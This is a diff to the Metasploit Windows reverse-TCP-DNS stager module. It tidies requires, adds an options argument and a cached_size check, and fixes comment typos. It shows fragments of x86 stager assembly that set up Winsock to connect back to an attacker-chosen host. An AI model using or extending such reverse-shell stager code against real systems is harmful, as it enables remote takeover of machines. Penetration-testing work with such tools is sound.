@@ -1,9 +1,5 @@
 # -*- coding: binary -*-
 
-require 'msf/core'
-require 'msf/core/payload/transport_config'
-require 'msf/core/payload/windows/reverse_tcp'
-
 module Msf
 
 ###
@@ -29,7 +25,7 @@ module Payload::Windows::ReverseTcpDns
   #
   # Generate the first stage
   #
-  def generate
+  def generate(_opts = {})
     conf = {
       port:        datastore['LPORT'],
       host:        datastore['LHOST'],
@@ -38,7 +34,7 @@ module Payload::Windows::ReverseTcpDns
     }
 
     # Generate the advanced stager if we have space
-    if self.available_space && required_space <= self.available_space
+    if self.available_space && cached_size && required_space <= self.available_space
       conf[:exitfunk] = datastore['EXITFUNC']
       conf[:reliable] = true
     end
@@ -88,12 +84,12 @@ module Payload::Windows::ReverseTcpDns
 
         mov eax, 0x0190        ; EAX = sizeof( struct WSAData )
         sub esp, eax           ; alloc some space for the WSAData structure
-        push esp               ; push a pointer to this stuct
+        push esp               ; push a pointer to this struct
         push eax               ; push the wVersionRequested parameter
         push #{Rex::Text.block_api_hash('ws2_32.dll', 'WSAStartup')}
         call ebp               ; WSAStartup( 0x0190, &WSAData );
 
-        push eax               ; if we succeed, eax wil be zero, push zero for the flags param.
+        push eax               ; if we succeed, eax will be zero, push zero for the flags param.
         push eax               ; push null for reserved parameter
         push eax               ; we do not specify a WSAPROTOCOL_INFO structure
         push eax               ; we do not specify a protocol
@@ -152,7 +148,7 @@ module Payload::Windows::ReverseTcpDns
     end
 
     asm << %Q^
-      ; this  lable is required so that reconnect attempts include
+      ; this label is required so that reconnect attempts include
       ; the UUID stuff if required.
       connected:
     ^
